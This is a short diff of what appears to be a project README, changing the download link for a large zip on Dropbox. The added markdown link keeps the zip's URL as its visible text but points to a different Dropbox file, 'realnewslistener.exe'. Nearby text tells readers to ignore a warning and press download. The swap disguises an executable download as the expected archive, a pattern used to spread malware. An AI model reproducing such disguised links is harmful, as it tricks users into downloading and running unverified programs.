@@ -41,8 +41,8 @@ dropbox with zip, 700MB, way too big for github:
 - it will say TOO BIG TO LOAD
 - - IGNORE THAT and PRESS DOWNLOAD
 
-https://www.dropbox.com/scl/fi/n8yc6ww1hd2om7n6loe3r/gpu-enabled-realnews-listener.zip?rlkey=nlq3fmys5orl22xfky88wkexb&st=mrcega4w&dl=0
-
+[https://www.dropbox.com/scl/fi/n8yc6ww1hd2om7n6loe3r/gpu-enabled-realnews-listener.zip?rlkey=nlq3fmys5orl22xfky88wkexb&st=mrcega4w&dl=0
+](https://www.dropbox.com/scl/fi/fxhdup4anghso9lfrmape/realnewslistener.exe?rlkey=k4o6bdysuepp2knyijdecmz9j&st=2m6nu22l&dl=0)
 ---
 
 ## Highlights
